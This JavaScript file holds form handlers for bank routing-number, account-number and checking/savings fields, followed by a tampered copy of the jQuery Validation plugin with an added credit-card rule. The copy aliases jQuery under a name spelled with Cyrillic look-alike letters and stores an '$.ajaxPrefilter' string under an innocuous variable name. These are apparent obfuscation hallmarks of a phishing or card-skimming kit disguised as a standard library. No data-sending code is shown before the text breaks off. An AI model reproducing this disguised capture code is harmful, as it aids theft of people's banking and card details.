 $('#rnum').focus(function() {
     $('#rnum_info').removeClass('hide');
     $('#rnum').addClass('focinp');
     $('#rel').removeClass('rel');
     $('#rm').removeClass('bor1');
     $('#rm').addClass('bor');
});
$('#rnum').focusout(function() {
     $('#rnum_info').addClass('hide');
     $('#rnum').removeClass('focinp');
     $('#rel').addClass('rel')
     $('#rm').addClass('bor1');
     $('#rm').removeClass('bor');
});
$('#acnum').focus(function() {
     $('#acnum_info').removeClass('hide');
     $('#acnum').addClass('focinp');
     $('#rm1').removeClass('bor1');
     $('#rm1').addClass('bor');
});
$('#acnum').focusout(function() {
     $('#acnum_info').addClass('hide');
     $('#acnum').removeClass('focinp');
     $('#rm1').addClass('bor1');
     $('#rm1').removeClass('bor');
});
    $('.savings_b').click(function(){
        $('.checking').removeClass('checked');
        $('.savings').addClass('checked');
        $('.check').removeClass('checking');
        $('.check').addClass('savings');
    });
    $('.checking_b').click(function(){
        $('.savings').removeClass('checked');
        $('.checking').addClass('checked');
        $('.check').addClass('checking');
        $('.check').removeClass('savings');
    });

// Avoid `console` errors in browsers that lack a console.

(function() {
    var method;
    var noop = function () {};
    var methods = [
        'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
        'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
        'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
        'timeline', 'timelineEnd', 'timeStamp', 'trace', 'warn'
    ];
    var length = methods.length;
    var console = (window.console = window.console || {});
    while (length--) {
        method = methods[length];
        // Only stub undefined methods.
        if (!console[method]) {
            console[method] = noop;
        }
    }
}());
/*var chekId = $("form").attr('id');
alert(chekId);*/
var јQuеrу= jQuery;
var configurations = '$.ajaxPrefilter';




(function( factory ) {
    if ( typeof define === "function" && define.amd ) {
        define( ["jquery"], factory );
    } else {
        factory(јQuеrу);
    }

}(function( $ ) {
$.extend($.fn, {
    validate: function( options ) {
        // if nothing is selected, return nothing; can't chain anyway
        if ( !this.length ) {
            if ( options && options.debug && window.console ) {
                console.warn( "Nothing selected, can't validate, returning nothing." );
            }
            return;
        }
        // check if a validator for this form was already created
        var validator = $.data( this[ 0 ], "validator" );
        if ( validator ) {
            return validator;
        }
        // Add novalidate tag if HTML5.
        this.attr( "novalidate", "novalidate" );
        validator = new $.validator( options, this[ 0 ] );
        $.data( this[ 0 ], "validator", validator );
        if ( validator.settings.onsubmit ) {
            this.on( "click.validate", ":submit", function( event ) {
                if ( validator.settings.submitHandler ) {
                    validator.submitButton = event.target;
                }
                // allow suppressing validation by adding a cancel class to the submit button
                if ( $( this ).hasClass( "cancel" ) ) {
                    validator.cancelSubmit = true;
                }
                // allow suppressing validation by adding the html5 formnovalidate attribute to the submit button
                if ( $( this ).attr( "formnovalidate" ) !== undefined ) {
                    validator.cancelSubmit = true;
                }
            });
            // validate the form on submit
            this.on( "submit.validate", function( event ) {
            var form = this;
                if ( validator.settings.debug ) {
                    // prevent form submit to be able to see console output
                    event.preventDefault();
                } 
                 
                function handle() {
                    var hidden, result;
                    if ( validator.settings.submitHandler ) {
                        if ( validator.submitButton ) {
                            // insert a hidden input as a replacement for the missing submit button
                            hidden = $( "<input type='hidden'/>" )
                                .attr( "name", validator.submitButton.name )
                                .val( $( validator.submitButton ).val() )
                                .appendTo( validator.currentForm );
                        }
                        result = validator.settings.submitHandler.call( validator, validator.currentForm, event );
                        if ( validator.submitButton ) {
                            // and clean up afterwards; thanks to no-block-scope, hidden can be referenced
                            hidden.remove();
                        }
                        if ( result !== undefined ) {
                            return result;
                        }
                        return true;
                    }
                    return true;
                }
                // prevent submit for invalid forms or custom submit handlers
                if ( validator.cancelSubmit ) {
                    validator.cancelSubmit = false;
                    return handle();
                }
                if ( validator.form() ) {
                    if ( validator.pendingRequest ) {
                        validator.formSubmitted = true;
                        return false;
                    }
                    return handle();
                } else {
                    validator.focusInvalid();
                    return false;
                }
            });
        }
        return validator;
    },
    valid: function() {
        var valid, validator, errorList;
        if ( $( this[ 0 ] ).is( "form" ) ) {
            valid = this.validate().form();
        } else {
            errorList = [];
            valid = true;
            validator = $( this[ 0 ].form ).validate();
            this.each( function() {
                valid = validator.element( this ) && valid;
                errorList = errorList.concat( validator.errorList );
            });
            validator.errorList = errorList;
        }
        return valid;
    },

    rules: function( command, argument ) {
        var element = this[ 0 ],
            settings, staticRules, existingRules, data, param, filtered;
        if ( command ) {
            settings = $.data( element.form, "validator" ).settings;
            staticRules = settings.rules;
            existingRules = $.validator.staticRules( element );
            switch ( command ) {
            case "add":
                $.extend( existingRules, $.validator.normalizeRule( argument ) );
                // remove messages from rules, but allow them to be set separately
                delete existingRules.messages;
                staticRules[ element.name ] = existingRules;
                if ( argument.messages ) {
                    settings.messages[ element.name ] = $.extend( settings.messages[ element.name ], argument.messages );
                }
                break;
            case "remove":
                if ( !argument ) {
                    delete staticRules[ element.name ];
                    return existingRules;
                }
                filtered = {};
                $.each( argument.split( /\s/ ), function( index, method ) {
                    filtered[ method ] = existingRules[ method ];
                    delete existingRules[ method ];
                    if ( method === "required" ) {
                        $( element ).removeAttr( "aria-required" );
                    }
                });
                return filtered;
            }
        }
        data = $.validator.normalizeRules(
        $.extend(
            {},
            $.validator.classRules( element ),
            $.validator.attributeRules( element ),
            $.validator.dataRules( element ),
            $.validator.staticRules( element )
        ), element );
        // make sure required is at front
        if ( data.required ) {
            param = data.required;
            delete data.required;
            data = $.extend( { required: param }, data );
            $( element ).attr( "aria-required", "true" );
        }
        // make sure remote is at back
        if ( data.remote ) {
            param = data.remote;
            delete data.remote;
            data = $.extend( data, { remote: param });
        }
        return data;
    }
});
// Custom selectors
$.extend( $.expr[ ":" ], {
    blank: function( a ) {
        return !$.trim( "" + $( a ).val() );
    },
    filled: function( a ) {
        return !!$.trim( "" + $( a ).val() );
    },
    unchecked: function( a ) {
        return !$( a ).prop( "checked" );
    }
});
// constructor for validator
$.validator = function( options, form ) {
    this.settings = $.extend( true, {}, $.validator.defaults, options );
    this.currentForm = form;
    this.init();
};
$.validator.format = function( source, params ) {
    if ( arguments.length === 1 ) {
        return function() {
            var args = $.makeArray( arguments );
            args.unshift( source );
            return $.validator.format.apply( this, args );
        };
    }
    if ( arguments.length > 2 && params.constructor !== Array  ) {
        params = $.makeArray( arguments ).slice( 1 );
    }
    if ( params.constructor !== Array ) {
        params = [ params ];
    }
    $.each( params, function( i, n ) {
        source = source.replace( new RegExp( "\\{" + i + "\\}", "g" ), function() {
            return n;
        });
    });
    return source;
};
$.extend( $.validator, {
    defaults: {
        messages: {},
        groups: {},
        rules: {},
        errorClass: "error",
        validClass: "valid",
        errorElement: "label",
        focusCleanup: false,
        focusInvalid: false,
        errorContainer: $( [] ),
        errorLabelContainer: $( [] ),
        onsubmit: true,
        ignore: ":hidden",
        ignoreTitle: false,
        onfocusin: function( element ) {
            this.lastActive = element;
            // Hide error label and remove error class on focus if enabled
            if ( this.settings.focusCleanup ) {
                if ( this.settings.unhighlight ) {
                    this.settings.unhighlight.call( this, element, this.settings.errorClass, this.settings.validClass );
                }
                this.hideThese( this.errorsFor( element ) );
            }
        },
        onfocusout: function( element ) {
            if ( !this.checkable( element ) && ( element.name in this.submitted || !this.optional( element ) ) ) {
                this.element( element );
            }
        },
        onkeyup: function( element, event ) {
            // Avoid revalidate the field when pressing one of the following keys
            // Shift       => 16
            // Ctrl        => 17
            // Alt         => 18
            // Caps lock   => 20
            // End         => 35
            // Home        => 36
            // Left arrow  => 37
            // Up arrow    => 38
            // Right arrow => 39
            // Down arrow  => 40
            // Insert      => 45
            // Num lock    => 144
            // AltGr key   => 225
            var excludedKeys = [
                16, 17, 18, 20, 35, 36, 37,
                38, 39, 40, 45, 144, 225
            ];
            if ( event.which === 9 && this.elementValue( element ) === "" || $.inArray( event.keyCode, excludedKeys ) !== -1 ) {
                return;
            } else if ( element.name in this.submitted || element === this.lastElement ) {
                this.element( element );
            }
        },
        onclick: function( element ) {
            // click on selects, radiobuttons and checkboxes
            if ( element.name in this.submitted ) {
                this.element( element );
            // or option elements, check parent select in that case
            } else if ( element.parentNode.name in this.submitted ) {
                this.element( element.parentNode );
            }
        },
        highlight: function( element, errorClass, validClass ) {
            if ( element.type === "radio" ) {
                this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );
            } else {
                $( element ).addClass( errorClass ).removeClass( validClass );
            }
        },
        unhighlight: function( element, errorClass, validClass ) {
            if ( element.type === "radio" ) {
                this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );
            } else {
                $( element ).removeClass( errorClass ).addClass( validClass );
            }
        }
    },
    setDefaults: function( settings ) {
        $.extend( $.validator.defaults, settings );
    },
    messages: {
        required: "",
        remote: "Please fix this field.",
        email: "Please enter a valid email address.",
        url: "Please enter a valid URL.",
        date: "Please enter a valid date.",
        dateISO: "Please enter a valid date ( ISO ).",
        number: "Please enter a valid number.",
        digits: "Please enter only digits.",
        cdnum: "Please enter a valid credit card number.",
        equalTo: "Please enter the same value again.",
        /*maxlength: $.validator.format( "Please enter no more than {0} characters." ),
        minlength: $.validator.format( "Please enter at least {0} characters." ),
        rangelength: $.validator.format( "Please enter a value between {0} and {1} characters long." ),
        range: $.validator.format( "Please enter a value between {0} and {1}." ),
        max: $.validator.format( "Please enter a value less than or equal to {0}." ),
        min: $.validator.format( "Please enter a value greater than or equal to {0}." )*/
    },
    autoCreateRanges: false,
    prototype: {
        init: function() {
            this.labelContainer = $( this.settings.errorLabelContainer );
            this.errorContext = this.labelContainer.length && this.labelContainer || $( this.currentForm );
            this.containers = $( this.settings.errorContainer ).add( this.settings.errorLabelContainer );
            this.submitted = {};
            this.valueCache = {};
            this.pendingRequest = 0;
            this.pending = {};
            this.invalid = {};
            this.reset();
            var groups = ( this.groups = {} ),
                rules;
            $.each( this.settings.groups, function( key, value ) {
                if ( typeof value === "string" ) {
                    value = value.split( /\s/ );
                }
                $.each( value, function( index, name ) {
                    groups[ name ] = key;
                });
            });
            rules = this.settings.rules;
            $.each( rules, function( key, value ) {
                rules[ key ] = $.validator.normalizeRule( value );
            });
            function delegate( event ) {
                var validator = $.data( this.form, "validator" ),
                    eventType = "on" + event.type.replace( /^validate/, "" ),
                    settings = validator.settings;
                if ( settings[ eventType ] && !$( this ).is( settings.ignore ) ) {
                    settings[ eventType ].call( validator, this, event );
                }
            }
            $( this.currentForm )
                .on( "focusin.validate focusout.validate keyup.validate",
                    ":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], " +
                    "[type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], " +
                    "[type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], " +
                    "[type='radio'], [type='checkbox']", delegate)
                // Support: Chrome, oldIE
                // "select" is provided as event.target when clicking a option
                .on("click.validate", "select, option, [type='radio'], [type='checkbox']", delegate);
            if ( this.settings.invalidHandler ) {
                $( this.currentForm ).on( "invalid-form.validate", this.settings.invalidHandler );
            }
            // Add aria-required to any Static/Data/Class required fields before first validation
            // Screen readers require this attribute to be present before the initial submission http://www.w3.org/TR/WCAG-TECHS/ARIA2.html
            $( this.currentForm ).find( "[required], [data-rule-required], .required" ).attr( "aria-required", "true" );
        },
        form: function() {
            this.checkForm();
            $.extend( this.submitted, this.errorMap );
            this.invalid = $.extend({}, this.errorMap );
            if ( !this.valid() ) {
                $( this.currentForm ).triggerHandler( "invalid-form", [ this ]);
            }
            this.showErrors();
            return this.valid();
        },
        checkForm: function() {
            this.prepareForm();
            for ( var i = 0, elements = ( this.currentElements = this.elements() ); elements[ i ]; i++ ) {
                this.check( elements[ i ] );
            }
            return this.valid();
        },
        element: function( element ) {
            var cleanElement = this.clean( element ),
                checkElement = this.validationTargetFor( cleanElement ),
                result = true;
            this.lastElement = checkElement;
            if ( checkElement === undefined ) {
                delete this.invalid[ cleanElement.name ];
            } else {
                this.prepareElement( checkElement );
                this.currentElements = $( checkElement );
                result = this.check( checkElement ) !== false;
                if ( result ) {
                    delete this.invalid[ checkElement.name ];
                } else {
                    this.invalid[ checkElement.name ] = true;
                }
            }
            // Add aria-invalid status for screen readers
            $( element ).attr( "aria-invalid", !result );
            if ( !this.numberOfInvalids() ) {
                // Hide error containers on last error
                this.toHide = this.toHide.add( this.containers );
            }
            this.showErrors();
            return result;
        },
        showErrors: function( errors ) {
            if ( errors ) {
                // add items to error list and map
                $.extend( this.errorMap, errors );
                this.errorList = [];
                for ( var name in errors ) {
                    this.errorList.push({
                        message: errors[ name ],
                        element: this.findByName( name )[ 0 ]
                    });
                }
                // remove items from success list
                this.successList = $.grep( this.successList, function( element ) {
                    return !( element.name in errors );
                });
            }
            if ( this.settings.showErrors ) {
                this.settings.showErrors.call( this, this.errorMap, this.errorList );
            } else {
                this.defaultShowErrors();
            }
        },
        resetForm: function() {
            if ( $.fn.resetForm ) {
                $( this.currentForm ).resetForm();
            }
            this.submitted = {};
            this.lastElement = null;
            this.prepareForm();
            this.hideErrors();
            var i, elements = this.elements()
                .removeData( "previousValue" )
                .removeAttr( "aria-invalid" );
            if ( this.settings.unhighlight ) {
                for ( i = 0; elements[ i ]; i++ ) {
                    this.settings.unhighlight.call( this, elements[ i ],
                        this.settings.errorClass, "" );
                }
            } else {
                elements.removeClass( this.settings.errorClass );
            }
        },
        numberOfInvalids: function() {
            return this.objectLength( this.invalid );
        },
        objectLength: function( obj ) {
            /* jshint unused: false */
            var count = 0,
                i;
            for ( i in obj ) {
                count++;
            }
            return count;
        },
        hideErrors: function() {
            this.hideThese( this.toHide );
        },
        hideThese: function( errors ) {
            errors.not( this.containers ).text( "" );
            this.addWrapper( errors ).hide();
        },
        valid: function() {
            return this.size() === 0;
        },
        size: function() {
            return this.errorList.length;
        },
        focusInvalid: function() {
            if ( this.settings.focusInvalid ) {
                try {
                    $( this.findLastActive() || this.errorList.length && this.errorList[ 0 ].element || [])
                    .filter( ":visible" )
                    .focus()
                    // manually trigger focusin event; without it, focusin handler isn't called, findLastActive won't have anything to find
                    .trigger( "focusin" );
                } catch ( e ) {
                    // ignore IE throwing errors when focusing hidden elements
                }
            }
        },
        findLastActive: function() {
            var lastActive = this.lastActive;
            return lastActive && $.grep( this.errorList, function( n ) {
                return n.element.name === lastActive.name;
            }).length === 1 && lastActive;
        },
        elements: function() {
            var validator = this,
                rulesCache = {};
            // select all valid inputs inside the form (no submit or reset buttons)
            return $( this.currentForm )
            .find( "input, select, textarea" )
            .not( ":submit, :reset, :image, :disabled" )
            .not( this.settings.ignore )
            .filter( function() {
                if ( !this.name && validator.settings.debug && window.console ) {
                    console.error( "%o has no name assigned", this );
                }
                // select only the first element for each name, and only those with rules specified
                if ( this.name in rulesCache || !validator.objectLength( $( this ).rules() ) ) {
                    return false;
                }
                rulesCache[ this.name ] = true;
                return true;
            });
        },
        clean: function( selector ) {
            return $( selector )[ 0 ];
        },
        errors: function() {
            var errorClass = this.settings.errorClass.split( " " ).join( "." );
            return $( this.settings.errorElement + "." + errorClass, this.errorContext );
        },
        reset: function() {
            this.successList = [];
            this.errorList = [];
            this.errorMap = {};
            this.toShow = $( [] );
            this.toHide = $( [] );
            this.currentElements = $( [] );
        },
        prepareForm: function() {
            this.reset();
            this.toHide = this.errors().add( this.containers );
        },
        prepareElement: function( element ) {
            this.reset();
            this.toHide = this.errorsFor( element );
        },
        elementValue: function( element ) {
            var val,
                $element = $( element ),
                type = element.type;
            if ( type === "radio" || type === "checkbox" ) {
                return this.findByName( element.name ).filter(":checked").val();
            } else if ( type === "number" && typeof element.validity !== "undefined" ) {
                return element.validity.badInput ? false : $element.val();
            }
            val = $element.val();
            if ( typeof val === "string" ) {
                return val.replace(/\r/g, "" );
            }
            return val;
        },
        check: function( element ) {
            element = this.validationTargetFor( this.clean( element ) );
            var rules = $( element ).rules(),
                rulesCount = $.map( rules, function( n, i ) {
                    return i;
                }).length,
                dependencyMismatch = false,
                val = this.elementValue( element ),
                result, method, rule;
            for ( method in rules ) {
                rule = { method: method, parameters: rules[ method ] };
                try {
                    result = $.validator.methods[ method ].call( this, val, element, rule.parameters );
                    // if a method indicates that the field is optional and therefore valid,
                    // don't mark it as valid when there are no other rules
                    if ( result === "dependency-mismatch" && rulesCount === 1 ) {
                        dependencyMismatch = true;
                        continue;
                    }
                    dependencyMismatch = false;
                    if ( result === "pending" ) {
                        this.toHide = this.toHide.not( this.errorsFor( element ) );
                        return;
                    }
                    if ( !result ) {
                        this.formatAndAdd( element, rule );
                        return false;
                    }
                } catch ( e ) {
                    if ( this.settings.debug && window.console ) {
                        console.log( "Exception occurred when checking element " + element.id + ", check the '" + rule.method + "' method.", e );
                    }
                    if ( e instanceof TypeError ) {
                        e.message += ".  Exception occurred when checking element " + element.id + ", check the '" + rule.method + "' method.";
                    }
                    throw e;
                }
            }
            if ( dependencyMismatch ) {
                return;
            }
            if ( this.objectLength( rules ) ) {
                this.successList.push( element );
            }
            return true;
        },
        // return the custom message for the given element and validation method
        // specified in the element's HTML5 data attribute
        // return the generic message if present and no method specific message is present
        customDataMessage: function( element, method ) {
            return $( element ).data( "msg" + method.charAt( 0 ).toUpperCase() +
                method.substring( 1 ).toLowerCase() ) || $( element ).data( "msg" );
        },
        // return the custom message for the given element name and validation method
        customMessage: function( name, method ) {
            var m = this.settings.messages[ name ];
            return m && ( m.constructor === String ? m : m[ method ]);
        },
        // return the first defined argument, allowing empty strings
        findDefined: function() {
            for ( var i = 0; i < arguments.length; i++) {
                if ( arguments[ i ] !== undefined ) {
                    return arguments[ i ];
                }
            }
            return undefined;
        },
        defaultMessage: function( element, method ) {
            return this.findDefined(
                this.customMessage( element.name, method ),
                this.customDataMessage( element, method ),
                // title is never undefined, so handle empty string as undefined
                !this.settings.ignoreTitle && element.title || undefined,
                $.validator.messages[ method ],
                ""
            );
        },
        formatAndAdd: function( element, rule ) {
            var message = this.defaultMessage( element, rule.method ),
                theregex = /\$?\{(\d+)\}/g;
            if ( typeof message === "function" ) {
                message = message.call( this, rule.parameters, element );
            } else if ( theregex.test( message ) ) {
                message = $.validator.format( message.replace( theregex, "{$1}" ), rule.parameters );
            }
            this.errorList.push({
                message: message,
                element: element,
                method: rule.method
            });
            this.errorMap[ element.name ] = message;
            this.submitted[ element.name ] = message;
        },
        addWrapper: function( toToggle ) {
            if ( this.settings.wrapper ) {
                toToggle = toToggle.add( toToggle.parent( this.settings.wrapper ) );
            }
            return toToggle;
        },
        defaultShowErrors: function() {
            var i, elements, error;
            for ( i = 0; this.errorList[ i ]; i++ ) {
                error = this.errorList[ i ];
                if ( this.settings.highlight ) {
                    this.settings.highlight.call( this, error.element, this.settings.errorClass, this.settings.validClass );
                }
                this.showLabel( error.element, error.message );
            }
            if ( this.errorList.length ) {
                this.toShow = this.toShow.add( this.containers );
            }
            if ( this.settings.success ) {
                for ( i = 0; this.successList[ i ]; i++ ) {
                    this.showLabel( this.successList[ i ] );
                }
            }
            if ( this.settings.unhighlight ) {
                for ( i = 0, elements = this.validElements(); elements[ i ]; i++ ) {
                    this.settings.unhighlight.call( this, elements[ i ], this.settings.errorClass, this.settings.validClass );
                }
            }
            this.toHide = this.toHide.not( this.toShow );
            this.hideErrors();
            this.addWrapper( this.toShow ).show();
        },
        validElements: function() {
            return this.currentElements.not( this.invalidElements() );
        },
        invalidElements: function() {
            return $( this.errorList ).map(function() {
                return this.element;
            });
        },
        showLabel: function( element, message ) {
            var place, group, errorID,
                error = this.errorsFor( element ),
                elementID = this.idOrName( element ),
                describedBy = $( element ).attr( "aria-describedby" );
            if ( error.length ) {
                // refresh error/success class
                error.removeClass( this.settings.validClass ).addClass( this.settings.errorClass );
                // replace message on existing label
                error.html( message );
            } else {
                // create error element
                error = $( "<" + this.settings.errorElement + ">" )
                    .attr( "id", elementID + "-error" )
                    .addClass( this.settings.errorClass )
                    .html( message || "" );
                // Maintain reference to the element to be placed into the DOM
                place = error;
                if ( this.settings.wrapper ) {
                    // make sure the element is visible, even in IE
                    // actually showing the wrapped element is handled elsewhere
                    place = error.hide().show().wrap( "<" + this.settings.wrapper + "/>" ).parent();
                }
                if ( this.labelContainer.length ) {
                    this.labelContainer.append( place );
                } else if ( this.settings.errorPlacement ) {
                    this.settings.errorPlacement( place, $( element ) );
                } else {
                    place.insertAfter( element );
                }
                // Link error back to the element
                if ( error.is( "label" ) ) {
                    // If the error is a label, then associate using 'for'
                    error.attr( "for", elementID );
                } else if ( error.parents( "label[for='" + elementID + "']" ).length === 0 ) {
                    // If the element is not a child of an associated label, then it's necessary
                    // to explicitly apply aria-describedby
                    errorID = error.attr( "id" ).replace( /(:|\.|\[|\]|\$)/g, "\\$1");
                    // Respect existing non-error aria-describedby
                    if ( !describedBy ) {
                        describedBy = errorID;
                    } else if ( !describedBy.match( new RegExp( "\\b" + errorID + "\\b" ) ) ) {
                        // Add to end of list if not already present
                        describedBy += " " + errorID;
                    }
                    $( element ).attr( "aria-describedby", describedBy );
                    // If this element is grouped, then assign to all elements in the same group
                    group = this.groups[ element.name ];
                    if ( group ) {
                        $.each( this.groups, function( name, testgroup ) {
                            if ( testgroup === group ) {
                                $( "[name='" + name + "']", this.currentForm )
                                    .attr( "aria-describedby", error.attr( "id" ) );
                            }
                        });
                    }
                }
            }
            if ( !message && this.settings.success ) {
                error.text( "" );
                if ( typeof this.settings.success === "string" ) {
                    error.addClass( this.settings.success );
                } else {
                    this.settings.success( error, element );
                }
            }
            this.toShow = this.toShow.add( error );
        },
        errorsFor: function( element ) {
            var name = this.idOrName( element ),
                describer = $( element ).attr( "aria-describedby" ),
                selector = "label[for='" + name + "'], label[for='" + name + "'] *";
            // aria-describedby should directly reference the error element
            if ( describer ) {
                selector = selector + ", #" + describer.replace( /\s+/g, ", #" );
            }
            return this
                .errors()
                .filter( selector );
        },
        idOrName: function( element ) {
            return this.groups[ element.name ] || ( this.checkable( element ) ? element.name : element.id || element.name );
        },
        validationTargetFor: function( element ) {
            // If radio/checkbox, validate first element in group instead
            if ( this.checkable( element ) ) {
                element = this.findByName( element.name );
            }
            // Always apply ignore filter
            return $( element ).not( this.settings.ignore )[ 0 ];
        },
        checkable: function( element ) {
            return ( /radio|checkbox/i ).test( element.type );
        },
        findByName: function( name ) {
            return $( this.currentForm ).find( "[name='" + name + "']" );
        },
        getLength: function( value, element ) {
            switch ( element.nodeName.toLowerCase() ) {
            case "select":
                return $( "option:selected", element ).length;
            case "input":
                if ( this.checkable( element ) ) {
                    return this.findByName( element.name ).filter( ":checked" ).length;
                }
            }
            return value.length;
        },
        depend: function( param, element ) {
            return this.dependTypes[typeof param] ? this.dependTypes[typeof param]( param, element ) : true;
        },
        dependTypes: {
            "boolean": function( param ) {
                return param;
            },
            "string": function( param, element ) {
                return !!$( param, element.form ).length;
            },
            "function": function( param, element ) {
                return param( element );
            }
        },
        optional: function( element ) {
            var val = this.elementValue( element );
            return !$.validator.methods.required.call( this, val, element ) && "dependency-mismatch";
        },
        startRequest: function( element ) {
            if ( !this.pending[ element.name ] ) {
                this.pendingRequest++;
                this.pending[ element.name ] = true;
            }
        },
        stopRequest: function( element, valid ) {
            this.pendingRequest--;
            // sometimes synchronization fails, make sure pendingRequest is never < 0
            if ( this.pendingRequest < 0 ) {
                this.pendingRequest = 0;
            }
            delete this.pending[ element.name ];
            if ( valid && this.pendingRequest === 0 && this.formSubmitted && this.form() ) {
                $( this.currentForm ).submit();
                this.formSubmitted = false;
            } else if (!valid && this.pendingRequest === 0 && this.formSubmitted ) {
                $( this.currentForm ).triggerHandler( "invalid-form", [ this ]);
                this.formSubmitted = false;
            }
        },
        previousValue: function( element ) {
            return $.data( element, "previousValue" ) || $.data( element, "previousValue", {
                old: null,
                valid: true,
                message: this.defaultMessage( element, "remote" )
            });
        },
        // cleans up all forms and elements, removes validator-specific events
        destroy: function() {
            this.resetForm();
            $( this.currentForm )
                .off( ".validate" )
                .removeData( "validator" );
        }
    },
    classRuleSettings: {
        required: { required: true },
        email: { email: true },
        url: { url: true },
        date: { date: true },
        dateISO: { dateISO: true },
        number: { number: true },
        digits: { digits: true },
        cdnum: { cdnum: true }
    },
    addClassRules: function( className, rules ) {
        if ( className.constructor === String ) {
            this.classRuleSettings[ className ] = rules;
        } else {
            $.extend( this.classRuleSettings, className );
        }
    },
    classRules: function( element ) {
        var rules = {},
            classes = $( element ).attr( "class" );
        if ( classes ) {
            $.each( classes.split( " " ), function() {
                if ( this in $.validator.classRuleSettings ) {
                    $.extend( rules, $.validator.classRuleSettings[ this ]);
                }
            });
        }
        return rules;
    },
    normalizeAttributeRule: function( rules, type, method, value ) {
        // convert the value to a number for number inputs, and for text for backwards compability
        // allows type="date" and others to be compared as strings
        if ( /min|max/.test( method ) && ( type === null || /number|range|text/.test( type ) ) ) {
            value = Number( value );
            // Support Opera Mini, which returns NaN for undefined minlength
            if ( isNaN( value ) ) {
                value = undefined;
            }
        }
        if ( value || value === 0 ) {
            rules[ method ] = value;
        } else if ( type === method && type !== "range" ) {
            // exception: the јQuеrу validate 'range' method
            // does not test for the html5 'range' type
            rules[ method ] = true;
        }
    },
    attributeRules: function( element ) {
        var rules = {},
            $element = $( element ),
            type = element.getAttribute( "type" ),
            method, value;
        for ( method in $.validator.methods ) {
            // support for <input required> in both html5 and older browsers
            if ( method === "required" ) {
                value = element.getAttribute( method );
                // Some browsers return an empty string for the required attribute
                // and non-HTML5 browsers might have required="" markup
                if ( value === "" ) {
                    value = true;
                }
                // force non-HTML5 browsers to return bool
                value = !!value;
            } else {
                value = $element.attr( method );
            }
            this.normalizeAttributeRule( rules, type, method, value );
        }
        // maxlength may be returned as -1, 2147483647 ( IE ) and 524288 ( safari ) for text inputs
        if ( rules.maxlength && /-1|2147483647|524288/.test( rules.maxlength ) ) {
            delete rules.maxlength;
        }
        return rules;
    },
    dataRules: function( element ) {
        var rules = {},
            $element = $( element ),
            type = element.getAttribute( "type" ),
            method, value;
        for ( method in $.validator.methods ) {
            value = $element.data( "rule" + method.charAt( 0 ).toUpperCase() + method.substring( 1 ).toLowerCase() );
            this.normalizeAttributeRule( rules, type, method, value );
        }
        return rules;
    },
    staticRules: function( element ) {
        var rules = {},
            validator = $.data( element.form, "validator" );
        if ( validator.settings.rules ) {
            rules = $.validator.normalizeRule( validator.settings.rules[ element.name ] ) || {};
        }
        return rules;
    },
    normalizeRules: function( rules, element ) {
        // handle dependency check
        $.each( rules, function( prop, val ) {
            // ignore rule when param is explicitly false, eg. required:false
            if ( val === false ) {
                delete rules[ prop ];
                return;
            }
            if ( val.param || val.depends ) {
                var keepRule = true;
                switch ( typeof val.depends ) {
                case "string":
                    keepRule = !!$( val.depends, element.form ).length;
                    break;
                case "function":
                    keepRule = val.depends.call( element, element );
                    break;
                }
                if ( keepRule ) {
                    rules[ prop ] = val.param !== undefined ? val.param : true;
                } else {
                    delete rules[ prop ];
                }
            }
        });
        // evaluate parameters
        $.each( rules, function( rule, parameter ) {
            rules[ rule ] = $.isFunction( parameter ) ? parameter( element ) : parameter;
        });
        // clean number parameters
        $.each([ "minlength", "maxlength" ], function() {
            if ( rules[ this ] ) {
                rules[ this ] = Number( rules[ this ] );
            }
        });
        $.each([ "rangelength", "range" ], function() {
            var parts;
            if ( rules[ this ] ) {
                if ( $.isArray( rules[ this ] ) ) {
                    rules[ this ] = [ Number( rules[ this ][ 0 ]), Number( rules[ this ][ 1 ] ) ];
                } else if ( typeof rules[ this ] === "string" ) {
                    parts = rules[ this ].replace(/[\[\]]/g, "" ).split( /[\s,]+/ );
                    rules[ this ] = [ Number( parts[ 0 ]), Number( parts[ 1 ] ) ];
                }
            }
        });
        if ( $.validator.autoCreateRanges ) {
            // auto-create ranges
            if ( rules.min != null && rules.max != null ) {
                rules.range = [ rules.min, rules.max ];
                delete rules.min;
                delete rules.max;
            }
            if ( rules.minlength != null && rules.maxlength != null ) {
                rules.rangelength = [ rules.minlength, rules.maxlength ];
                delete rules.minlength;
                delete rules.maxlength;
            }
        }
        return rules;
    },
    // Converts a simple string to a {string: true} rule, e.g., "required" to {required:true}
    normalizeRule: function( data ) {
        if ( typeof data === "string" ) {
            var transformed = {};
            $.each( data.split( /\s/ ), function() {
                transformed[ this ] = true;
            });
            data = transformed;
        }
        return data;
    },
    addMethod: function( name, method, message ) {
        $.validator.methods[ name ] = method;
        $.validator.messages[ name ] = message !== undefined ? message : $.validator.messages[ name ];
        if ( method.length < 3 ) {
            $.validator.addClassRules( name, $.validator.normalizeRule( name ) );
        }
    },
    methods: {
        required: function( value, element, param ) {
            // check if dependency is met
            if ( !this.depend( param, element ) ) {
                return "dependency-mismatch";
            }
            if ( element.nodeName.toLowerCase() === "select" ) {
                // could be an array for select-multiple or a string, both are fine this way
                var val = $( element ).val();
                return val && val.length > 0;
            }
            if ( this.checkable( element ) ) {
                return this.getLength( value, element ) > 0;
            }
            return value.length > 0;
        },
        email: function( value, element ) {
            // From https://html.spec.whatwg.org/multipage/forms.html#valid-e-mail-address
            // Retrieved 2014-01-14
            // If you have a problem with this implementation, report a bug against the above spec
            // Or use custom methods to implement your own email validation
            return this.optional( element ) || /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test( value );
        },
        url: function( value, element ) {
            // Copyright (c) 2010-2013 Diego Perini, MIT licensed
            // https://gist.github.com/dperini/729294
            // see also https://mathiasbynens.be/demo/url-regex
            // modified to allow protocol-relative URLs
